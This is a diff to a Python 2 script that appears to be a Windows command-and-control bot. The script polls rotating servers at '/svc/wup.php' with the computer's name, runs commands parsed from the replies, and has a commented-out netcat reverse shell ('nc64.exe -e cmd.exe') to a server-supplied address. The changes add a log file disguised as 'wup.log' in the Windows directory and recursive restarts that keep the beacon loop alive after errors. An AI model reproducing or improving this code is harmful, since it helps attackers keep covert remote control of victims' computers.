@@ -22,6 +22,8 @@ from uuid import getnode as get_mac
 from subprocess import Popen
 from fake_useragent import UserAgent
 import requests
+import logging
+
 #import win32ui, win32gui, win32com, pythoncom, win32con
 #from win32com.client import Dispatch
 #from time import sleep
@@ -176,11 +178,14 @@ def myloop():
     header = {'User-Agent':str(ua.chrome)}
     #header = {'User-Agent': 'Mozilla/5.0'}
     #print(header)
+    logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO)
+    logging.info('Start')
+    
     while True:
         
         
         try:
-                
+                logging.info('Step')
                 if sinit == '0':
                         Init()
                         
@@ -218,6 +223,8 @@ def myloop():
                         scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                         print skill
                 else:
+                        logging.info('Not 200')
+                        myloop()
                         if site == site1:
                             site=site2
                         elif site == site2:
@@ -295,6 +302,7 @@ def myloop():
                             #print r.text
                         except Exception,e:
                             print str(e)
+                            myloop()
                         #httpServ = httplib.HTTPConnection(site, 80)
                         #httpServ.connect()
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
@@ -313,6 +321,7 @@ def myloop():
                                     #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                         except Exception,e:
                             print str(e)
+                            myloop()
                         #httpServ = httplib.HTTPConnection(site, 80)
                         #httpServ.connect()
                         #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
@@ -349,6 +358,7 @@ def myloop():
 ##                                            print str(e)
                 site=site1
         except Exception,e:
+                logging.info(str(e))
                 print str(e)
                 #print e.errno
                 #if e.errno == 11001: 
